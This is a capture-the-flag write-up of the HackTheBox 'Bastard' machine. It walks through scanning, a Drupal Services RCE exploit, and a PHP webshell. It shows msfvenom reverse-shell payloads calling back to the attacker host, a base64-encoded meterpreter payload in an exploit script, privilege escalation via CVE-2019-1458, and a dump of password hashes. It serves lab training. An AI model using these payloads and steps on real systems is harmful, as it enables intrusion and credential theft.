# Bastard | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.48]─[htb-jib1337@htb-n23bsvsbe8]─[~/my_data/utils]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.47.58
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 07:26 UTC
Nmap scan report for 10.129.47.58
Host is up (0.22s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   217.80 ms 10.10.14.1
2   217.91 ms 10.129.47.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.57 seconds
```
The machine is running a web server with Drupal.

### 2. Enumeration
The homepage for the server is a plain Drupal page with no content.
There is big listing of files and directories at robots.txt:
```
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```
The changelog.txt file suggests this version of the CMS is Drupal 7.54. Researching this version leads me to an exploit: https://www.exploit-db.com/exploits/41564 that can retrieve cached admin credentials and use them to write files to the machine. The exploit details are at: https://www.ambionics.io/blog/drupal-services-module-rce.
  
*Upon auditing Drupal's Services module, the Ambionics team came accross an insecure use of unserialize(). The exploitation of the vulnerability allowed for privilege escalation, SQL injection and, finally, remote code execution.*
  
### 3. Set up exploit
Update the code to point to the site and rest endpoint:
```php
$url = 'http://10.129.47.58';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'payload.php',
    'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
];
```
To find the rest endpoint, I try a few different paths and eventually land on a 200 which occurs at /rest.
```bash
┌──(kali㉿kali)-[~/bastard]
└─$ curl http://10.129.47.58/rest
Services Endpoint "rest_endpoint" has been setup successfully.
```
Create the payload:
```bash
┌──(kali㉿kali)-[~/bastard]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.48 LPORT=9999 > payload.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1112 bytes
```
We should be ready to go.

### 4. Run the exploit
Running the exploit:
```bash
┌──(kali㉿kali)-[~/bastard]
└─$ ./drugalexploit.php          

Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.47.58/payload.php
```
After which we have retrieved the session.json and user.json files. Looking at the user.json:
```bash
┌──(kali㉿kali)-[~/bastard]
└─$ cat user.json             
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1600794805",
    "login": 1606124282,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}
```
Unfortunately, my shell doesn't trigger when I visit the uploaded php file. I try a few other attempts with various I could keep going and figure out what is going on with it, but eventually move on to looking at the session information at session.json. I can add this into the current session using Firefox's web dev tools. This gives me access to the admin panel of the CMS.

### 5. Explore the admin panel
Within the modules section of the admin panel is a module called "PHP filter", which "Allows embedded PHP code/snippets to be evaluated". By turning this on and opening up the permissions for it, I can get the server to evaluate PHP code in any articles I post on the blog.

### 6. Get a shell
I can now take the contents of my generated payload.php file before, copy it into an article and publish it to the page. Once that's done, I can set up a handler and access the page to pop the meterpreter session.
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.48:9999 
[*] Sending stage (39282 bytes) to 10.129.47.58
[*] Meterpreter session 1 opened (10.10.14.48:9999 -> 10.129.47.58:49437) at 2020-11-23 06:11:38 -0500

meterpreter > getuid
Server username: IUSR (0)
meterpreter > sysinfo
Computer    : BASTARD
OS          : Windows NT BASTARD 6.1 build 7600 (Windows Server 2008 R2 Datacenter Edition) i586
Meterpreter : php/windows
```
Once I get on the server, I notice I messed up the exploit before which is why my previous shells didn't work! I forgot to fix the data for get_file_contents.
```bash
meterpreter > cat cmdshell.php
<?php eval(file_get_contents('php://input')); ?>
```
I can go back and try this again later I guess.

### 7. Enumerate from foothold
Before I can begin enumeration I need to get out of the php meterpreter session which is quite limited, and would basically not let me drop into any type of useful cmd or powershell shell without dying. To do this I generate another payload, this time as an exe using a reverse tcp connection, upload it using my php meterpreter and execute it on the target.
```bash
meterpreter > execute -f shell.exe
Process 2132 created.
meterpreter > 
[*] Sending stage (175174 bytes) to 10.129.47.58
[*] Meterpreter session 5 opened (10.10.14.48:9998 -> 10.129.47.58:49447) at 2020-11-23 06:36:56 -0500

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.129.47.58 - Meterpreter session 4 closed.  Reason: User exit
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  5         meterpreter x86/windows  IIS APPPOOL\Drupal @ BASTARD  10.10.14.48:9998 -> 10.129.47.58:49447 (10.129.47.58)

msf6 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > sysinfo
Computer        : BASTARD
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x64/windows
```
I can then run JAWS to enumerate the target (see jaws_out.txt).
```bash
meterpreter > shell
Process 2112 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1

Running J.A.W.S. Enumeration
        - Gathering User Information
        - Gathering Processes, Services and Scheduled Tasks
        - Gathering Installed Software
        - Gathering File System Information
        - Looking for Simple Priv Esc Methods
############################################################
##     J.A.W.S. (Just Another Windows Enum Script)        ##
##                                                        ##
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version: Microsoft Windows Server 2008 R2 Datacenter 
Architecture: x86
Hostname: BASTARD
Current User: Drupal
Current Time\Date: 11/23/2020 13:43:21
...
```
The output is pretty bare, with no outstanding privesc paths except for the rather old version of Windows. I can use MSF's local exploit suggester to narrow down the search.
```bash
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.47.58 - Collecting local exploits for x64/windows...
[*] 10.129.47.58 - 20 exploit checks are being tried...
[+] 10.129.47.58 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.47.58 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.47.58 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.129.47.58 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.47.58 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.129.47.58 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```
Only a few of these are going to achieve privilege escalation, including MS10_092 (which doesn't work) and CVE-2019-1458 (https://googleprojectzero.blogspot.com/p/rca-cve-2019-1458.html)

### 8. Escalate to system
```bash
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > run

[*] Started reverse TCP handler on 10.10.14.48:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Launching notepad.exe to host the exploit...
[+] Process 3064 launched.
[*] Injecting exploit into 3064 ...
[*] Exploit injected. Injecting payload into 3064...
[*] Payload injected. Executing exploit...
[*] Sending stage (200262 bytes) to 10.129.47.58
[*] Meterpreter session 9 opened (10.10.14.48:4444 -> 10.129.47.58:49453) at 2020-11-23 07:03:43 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::
dimitris:1004:aad3b435b51404eeaad3b435b51404ee:57544bb8930967eee7f44d46f8bfe59d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Notes
I went back and re-attempted the Drupal exploit, this time spawning a shell using the dropped file. To do it, I base64 encode the reverse shell code and then have it decoded and written into the file by the exploit.
```php
#!/usr/bin/php
<?php

# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.129.47.58';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

// msfvenom php meterpreter payload
$filedata = base64_decode('Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE0LjQ4JzsgJHBvcnQgPSA5OTk4OyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmNzJyk7IH0gaWYgKCEkcykgeyBkaWUoJ25vIHNvY2tldCcpOyB9IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7IH0gaWYgKCEkbGVuKSB7IGRpZSgpOyB9ICRhID0gdW5wYWNrKCJObGVuIiwgJGxlbik7ICRsZW4gPSAkYVsnbGVuJ107ICRiID0gJyc7IHdoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgeyBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IH0gfSAkR0xPQkFMU1snbXNnc29jayddID0gJHM7ICRHTE9CQUxTWydtc2dzb2NrX3R5cGUnXSA9ICRzX3R5cGU7IGlmIChleHRlbnNpb25fbG9hZGVkKCdzdWhvc2luJykgJiYgaW5pX2dldCgnc3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWwnKSkgeyAkc3Vob3Npbl9ieXBhc3M9Y3JlYXRlX2Z1bmN0aW9uKCcnLCAkYik7ICRzdWhvc2luX2J5cGFzcygpOyB9IGVsc2UgeyBldmFsKCRiKTsgfSBkaWUoKTs=');

$file = [
    'filename' => 'shell.php',
    'data' => $filedata
];

$browser = new Browser($url . $endpoint_path);


# Stage 1: SQL Injection
...
```